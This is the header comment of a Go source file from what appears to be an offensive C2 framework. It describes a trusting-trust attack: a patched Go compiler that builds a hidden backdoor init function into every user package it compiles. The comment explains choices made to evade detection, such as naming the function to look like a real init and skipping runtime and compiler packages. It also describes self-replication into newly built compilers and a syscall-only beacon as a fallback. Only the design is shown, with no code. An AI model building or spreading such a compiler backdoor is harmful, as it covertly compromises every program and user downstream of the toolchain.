/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	init_injector.go — Core IR injection engine.

	This file is compiled INTO the modified Go compiler (cmd/compile).
	It lives inside the compiler binary and runs during every compilation.

	InjectBackdoor() is called from our patched pkginit.MakeTask().
	It synthesizes a new ir.Func (init function) containing the backdoor
	goroutine and appends it to typecheck.Target.Inits — the list of
	package init functions that the compiler will emit into the binary.

	Key design decisions:

	1. We synthesize IR directly rather than parsing source.
	   Parsing source would require a separate Go parser invocation and
	   leave traces in the build graph. Direct IR construction is invisible.

	2. We use noder.Renameinit() to get a unique init function name.
	   This gives us "init.sliverXXX" — indistinguishable from real inits.

	3. We check base.Ctxt.Pkgpath against a target list. The backdoor is
	   only injected into user-facing packages, NOT into:
	     - runtime/* (would crash the runtime)
	     - internal/* (internal packages only)
	     - cmd/compile/* (would cause recursion / detection)
	     - reflect, unsafe (ABI-sensitive)

	4. Self-replication: when Pkgpath == "cmd/compile/internal/pkginit",
	   we inject a different payload — one that re-installs our hook in
	   the new compiler binary. This is the Thompson Quine mechanism.

	5. Import injection: if the target package doesn't import "net/http"
	   or "os", we fall back to raw syscall-based beacon using only
	   packages that every Go binary already links (runtime, syscall).
*/

